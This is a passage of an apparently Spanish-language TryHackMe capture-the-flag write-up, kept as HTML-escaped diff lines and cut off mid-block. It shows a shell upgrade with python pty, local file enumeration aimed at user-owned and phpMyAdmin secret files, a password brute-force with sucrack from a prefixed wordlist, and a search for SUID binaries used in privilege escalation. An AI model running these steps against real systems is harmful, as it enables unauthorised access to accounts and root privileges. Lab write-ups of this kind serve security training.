+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;$ python -c &amp;#39;&lt;/span&gt;import pty&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;pty.spawn&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ../../
+ls
+index.php  plugins  themes  upgrade
+&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ../
+ls
+announcements    wp-admin              wp-cron.php        wp-mail.php
+index.php        wp-blog-header.php    wp-includes        wp-settings.php
+license.txt      wp-comments-post.php  wp-links-opml.php  wp-signup.php
+readme.html      wp-config.php         wp-load.php        wp-trackback.php
+wp-activate.php  wp-content            wp-login.php       xmlrpc.php
+&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ../
+ls
+html  subdomain
+&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; html
+ls
+announcements    wp-blog-header.php    wp-links-opml.php  wp-trackback.php
+index.php        wp-comments-post.php  wp-load.php        wwe3bbfla4g.txt
+license.txt      wp-config.php         wp-login.php       xmlrpc.php
+readme.html      wp-content            wp-mail.php
+wp-activate.php  wp-cron.php           wp-settings.php
+wp-admin         wp-includes           wp-signup.php
+cat wwe3bbfla4g.txt
+cat wwe3bbfla4g.txt
+THM&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;THIS_FLAG_IS_FAKE_WEBTXT&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+www-data@ubuntu:/var/www/html$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Realizamos una enumeracion utilizando &lt;code&gt;grep&lt;/code&gt; y &lt;code&gt;ls&lt;/code&gt; ya que el comando &lt;code&gt;find&lt;/code&gt; solo lo pueden ejecutar &lt;code&gt;hakanbey&lt;/code&gt; y &lt;code&gt;root&lt;/code&gt;, aunque no encontramos ningun archivo que fuera de ayuda por el momento.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@ubuntu:/dev/shm$ ls -lahR / 2&amp;gt;/dev/null&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; awk &lt;span class=&#34;s1&#34;&gt;&amp;#39;/:$/&amp;amp;&amp;amp;f{s=$0;f=0}/:$/&amp;amp;&amp;amp;!f{sub(/:$/,&amp;#34;&amp;#34;);s=$0;f=1;next}NF&amp;amp;&amp;amp;f{ print s&amp;#34;/&amp;#34;$0 }&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep hakanbey
+/home/drwxr-x--- &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; hakanbey hakanbey 4.0K Mar &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 12:45 hakanbey
+/usr/bin/-r-srwx---  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   hakanbey   13K Jan &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 18:01 binary
+/usr/bin/-rwxr-x---  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   hakanbey  233K Nov  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; find
+/var/lib/AccountsService/users/-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;248&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 20:30 hakanbey
+/var/lib/lightdm-data/drwxrwx---  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; hakanbey lightdm 4.0K Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 18:32 hakanbey
+/var/www/html/-rwxrwxrwx  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hakanbey hakanbey   &lt;span class=&#34;m&#34;&gt;38&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 16:50 wwe3bbfla4g.txt
+www-data@ubuntu:/dev/shm$
+www-data@ubuntu:/dev/shm$ ls -lahR / 2&amp;gt;/dev/null&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; awk &lt;span class=&#34;s1&#34;&gt;&amp;#39;/:$/&amp;amp;&amp;amp;f{s=$0;f=0}/:$/&amp;amp;&amp;amp;!f{sub(/:$/,&amp;#34;&amp;#34;);s=$0;f=1;next}NF&amp;amp;&amp;amp;f{ print s&amp;#34;/&amp;#34;$0 }&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep &lt;span class=&#34;s2&#34;&gt;&amp;#34;www-data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep -v &lt;span class=&#34;s2&#34;&gt;&amp;#34;/var/www/&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep -v &lt;span class=&#34;s2&#34;&gt;&amp;#34;/proc&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -v &lt;span class=&#34;s2&#34;&gt;&amp;#34;/run&amp;#34;&lt;/span&gt;
+/etc/phpmyadmin/-rw-r-----   &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root www-data  &lt;span class=&#34;m&#34;&gt;520&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 23:06 config-db.php
+/etc/phpmyadmin/-rw-r-----   &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root www-data    &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 21:43 htpasswd.setup
+/var/cache/drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; www-data  www-data 4.0K Feb &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; tcpdf
+/var/cache/apache2/drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; www-data www-data 4.0K Aug &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; mod_cache_disk
+/var/cache/apache2/mod_cache_disk/drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; www-data www-data 4.0K Aug &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; .
+/var/cache/tcpdf/drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; www-data www-data 4.0K Feb &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; .
+/var/lib/phpmyadmin/-rw-r-----  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root     www-data   &lt;span class=&#34;m&#34;&gt;68&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 21:43 blowfish_secret.inc.php
+/var/lib/phpmyadmin/-rw-r-----  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root     www-data    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 21:43 config.inc.php
+/var/lib/phpmyadmin/drwxr-xr-x  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; www-data www-data 4.0K Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 00:16 tmp
+/var/lib/phpmyadmin/tmp/drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; www-data www-data 4.0K Nov &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 00:16 .
+/var/lib/ucf/cache/-rw-r----- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root www-data  &lt;span class=&#34;m&#34;&gt;520&lt;/span&gt; Jan &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 23:06 :etc:phpmyadmin:config-db.php
+www-data@ubuntu:/dev/shm
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;hakanbey---user&#34;&gt;HAKANBEY - USER&lt;/h1&gt;
+&lt;p&gt;Siguiendo las diferentes pistas como el tag de la room, utilizamos &lt;code&gt;sucrack&lt;/code&gt; para intentar obtener la contraseña del usuario &lt;code&gt;hakanbey&lt;/code&gt; con la wordlist del directorio &amp;ldquo;oculto&amp;rdquo;, aunque luego de varias horas no logramos encontrar la contraseña en el wordlist.&lt;/p&gt;
+&lt;p&gt;Observamos las pistas dadas en el &lt;a href=&#34;http://discord.gg/tryhackme&#34;&gt;Discord - TryHackMe&lt;/a&gt;, creamos un diccionario a partir de el prefijo de las dos contraseñas previamente encontradas en &lt;code&gt;wordlist.txt&lt;/code&gt; logramos encontrar la contraseña del usuaro hakanbey.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 123adanaantinwar&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# 123adanacrack&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# 123adana &amp;lt;&amp;lt;&amp;lt;--- prefix&lt;/span&gt;
+
+www-data@ubuntu:/dev/shm/tmp$ cat wordlist.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; line&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; 123adana&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; &amp;gt; 123adana.txt
+www-data@ubuntu:/dev/shm/tmp$ ../sucrack -u hakanbey -b &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; -w &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 123adana.txt
+447/803863
+4015/803863
+9895/803863
+12796/803863
+16252/803863
+18071/803863
+21805/803863
+24561/803863
+26824/803863
+31110/803863
+34770/803863
+password is: NOTAPASSWORD
+www-data@ubuntu:/dev/shm/tmp$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Realizamos la lectura de la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hakanbey@ubuntu:~$ pwd&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;id
+/home/hakanbey
+&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;hakanbey&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;hakanbey&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;hakanbey&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;adm&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,24&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;cdrom&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,30&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;dip&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,46&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;plugdev&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,108&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;lxd&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+hakanbey@ubuntu:~$ ls
+Desktop    Downloads  Pictures  Templates  Videos
+Documents  Music      Public    user.txt   website
+hakanbey@ubuntu:~$ cat user.txt
+THM&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;HELLO_AGAIN_FAKE_FLAG&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
+&lt;p&gt;Hacemos una pequeña enumeracion y encontramos un fichero (&lt;code&gt;binary&lt;/code&gt;) con permisos SUID. Utilizamos env para obtener una shell root.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hakanbey@ubuntu:~$ find / -perm -4000 2&amp;gt;/dev/null&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;xargs ls -lah
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        31K Aug &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; /bin/fusermount
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        43K Sep &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /bin/mount
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        63K Jun &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /bin/ping
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        44K Mar &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /bin/su
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        27K Sep &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /bin/umount
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        22K Jun &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/arping
+-rwsr-sr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; daemon daemon      51K Feb &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; /usr/bin/at
+-r-srwx--- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   hakanbey    13K Jan &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 18:01 /usr/bin/binary
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        75K Mar &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/chfn
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        44K Mar &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/chsh
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        75K Mar &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/gpasswd
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        40K Mar &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/newgrp
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        59K Mar &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/passwd
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        22K Mar &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/pkexec
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root       146K Jan &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /usr/bin/sudo
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        19K Jun &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/bin/traceroute6.iputils
+-rwsr-xr-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   messagebus  42K Jun &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        10K Mar &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root       427K Mar  &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        14K Mar &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root       621K Mar &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; 13:02 /usr/local/bin/sudo
+-rwsrwxrwx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root       1.1M May &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /usr/sbin/exim4
+-rwsr-xr-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   dip        370K Jul &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /usr/sbin/pppd
+hakanbey@ubuntu:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;strace&#34;&gt;STRACE&lt;/h2&gt;
+&lt;p&gt;Al ejecutar el fichero pide  la string correcta, al ingresar nuestra contraseña nos mata la shell con &lt;code&gt;hakanbey&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hakanbey@ubuntu:/$ /usr/bin/binary
+I think you should enter the correct string &lt;span class=&#34;nv&#34;&gt;here&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;gt;123adanasubaru
+pkill: killing pid &lt;span class=&#34;m&#34;&gt;1791&lt;/span&gt; failed: Operation not permitted
+pkill: killing pid &lt;span class=&#34;m&#34;&gt;1958&lt;/span&gt; failed: Operation not permitted
+www-data@ubuntu:/$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Utilizamos ltrace para ver un poco el codigo que esta siendo ejecutado, observamos que &lt;code&gt;warzoneinadana&lt;/code&gt; es un string que esta siendo concatenado, además es comparada con la string que ingresamos, en el caso de no ser iguales mata nuestra shell.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
